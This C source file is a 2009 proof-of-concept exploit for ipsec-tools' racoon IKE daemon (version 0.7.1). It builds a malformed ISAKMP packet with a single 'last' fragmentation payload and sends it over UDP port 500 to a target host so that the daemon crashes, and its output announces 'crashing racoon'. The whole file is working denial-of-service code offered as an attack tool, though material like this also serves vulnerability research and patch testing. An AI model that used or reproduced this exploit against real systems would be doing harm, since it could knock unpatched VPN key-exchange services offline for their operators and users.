/* racoon-isakmp-dos.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * ipsec-tools racoon frag-isakmp DoS POC
 * by mu-b - Thu Apr 02 2009
 *
 * - Tested on: ipsec-tools-0.7.1
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/types.h>

#define DEF_PORT                500
#define PORT_ISAKMP             DEF_PORT

#define ISAKMP_VERSION_NUMBER   0x10
#define ISAKMP_ETYPE_BASE       1         /* Base */

/* Frag does not seems to be documented */
#define ISAKMP_NPTYPE_FRAG      132       /* IKE fragmentation payload */

/* flags */
#define ISAKMP_FRAG_LAST        1

typedef u_char cookie_t[8];

/* 3.1 ISAKMP Header Format */
struct isakmp {
  cookie_t i_ck;            /* Initiator Cookie */
  cookie_t r_ck;            /* Responder Cookie */
  unsigned char np;         /* Next Payload Type */
  unsigned char v;
  unsigned char etype;      /* Exchange Type */
  unsigned char flags;      /* Flags */
  unsigned int msgid;
  unsigned int len;         /* Length */
};

/* IKE fragmentation payload */
struct isakmp_frag {
  unsigned short unknown0;  /* always set to zero? */
  unsigned short len;
  unsigned short unknown1;  /* always set to 1? */
  unsigned char index;
  unsigned char flags;
};

/* used to verify the r_ck. */
static u_char r_ck0[] = { 0,0,0,0,0,0,0,0 };

static void
isa_kmp_dos (char *host)
{
  char buf[sizeof (struct isakmp) +
           sizeof (struct isakmp_frag)];
  struct isakmp *hdr;
  struct isakmp_frag *frag;
  struct sockaddr_in saddr;
  struct hostent *hp;
  int fd, i, len, n;

  if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
    {
      perror ("socket()");
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (EXIT_FAILURE);
    }

  memset (&saddr, 0, sizeof saddr);
  memcpy ((char *) &saddr.sin_addr, hp->h_addr, hp->h_length);
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons (PORT_ISAKMP);

  /* formulate request */
  memset (buf, 0, sizeof (buf));

  hdr = (struct isakmp *) buf;
  frag = (struct isakmp_frag *) (hdr + 1);

  for (i = 0; i < sizeof (hdr->i_ck); i++)
    hdr->i_ck[i] = (rand () % 255) + 1;

  memcpy (&hdr->r_ck, r_ck0, sizeof (hdr->r_ck));
  hdr->v = ISAKMP_VERSION_NUMBER;
  hdr->flags = 0;
  hdr->etype = ISAKMP_ETYPE_BASE;
  hdr->msgid = 0;
  hdr->np = ISAKMP_NPTYPE_FRAG;

  len = sizeof (struct isakmp) + sizeof (struct isakmp_frag);
  hdr->len = htonl (len);

  frag->len = htons (sizeof (struct isakmp_frag));
  frag->index = 1;
  frag->flags = ISAKMP_FRAG_LAST;

  n = sendto (fd, hdr, len, 0, (struct sockaddr *) &saddr, sizeof saddr);
  if (n < 0 || n != len)
    {
      fprintf (stderr, "isa_kmp_dos: sendto %d != %d\n", n, len);
      exit (EXIT_FAILURE);
    }

  close (fd);
}

int
main (int argc, char **argv)
{
  printf ("ipsec-tools racoon frag-isakmp DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  printf ("* crashing racoon... ");
  isa_kmp_dos (argv[1]);
  printf ("done\n\n");

  return (EXIT_SUCCESS);
}

